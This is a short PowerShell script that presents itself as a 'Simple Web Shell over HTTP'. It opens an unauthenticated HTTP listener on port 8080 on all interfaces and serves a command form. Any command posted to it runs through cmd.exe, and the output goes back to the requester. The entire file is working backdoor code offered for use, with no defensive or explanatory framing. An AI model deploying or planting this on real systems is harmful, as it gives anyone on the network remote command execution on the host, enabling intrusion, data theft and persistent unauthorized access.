<#
  .SYNOPSIS
  
  Simple Web Shell over HTTP
  
#>

$Server = '127.0.0.1' #Listening IP. Change This. Or make it a parameter, I don't care ;-)

function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   $cmd = $output.Split("=")
   $OutputVariable = &{ cmd.exe /c $cmd[1].Split("+") | Out-String}
   return $OutputVariable
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:8080/') 

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	
	if ($request.Url -match '/shellPost$' -and ($request.HttpMethod -eq "POST") ) { 
		
		$message = Receive-Request($request);
		
	}
    if ($request.Url -match '/shell$' -and ($request.HttpMethod -eq "GET")) {
		$enc = [system.Text.Encoding]::UTF8
		$response.ContentType = 'text/html'
		$shellcode = '<form action="/shellPost" method="POST" >
					  Command:<br>
					  <input type="text" name="Command" value="ipconfig.exe"><br>
					  <input type="submit" value="Submit">
					</form>'
		
		$buffer = $enc.GetBytes($shellcode)		
		$response.ContentLength64 = $buffer.length
		$output = $response.OutputStream
		$output.Write($buffer, 0, $buffer.length)
		$output.Close()
		continue
	}
    

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()